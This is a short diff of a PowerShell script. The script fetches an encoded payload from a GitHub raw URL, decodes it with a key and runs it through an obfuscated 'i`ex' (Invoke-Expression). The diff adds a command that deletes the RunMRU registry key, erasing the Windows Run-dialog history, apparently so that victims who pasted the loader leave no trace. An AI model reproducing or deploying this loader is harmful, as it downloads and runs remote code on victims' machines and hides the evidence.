@@ -13,4 +13,7 @@
 $k = "$k"
 $t = irm "https://raw.githubusercontent.com/Bongman1234/assets/main/y6rhf4w"
 $isn = dojob -sec $t -bty $k
+
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+
 $isn | i`ex
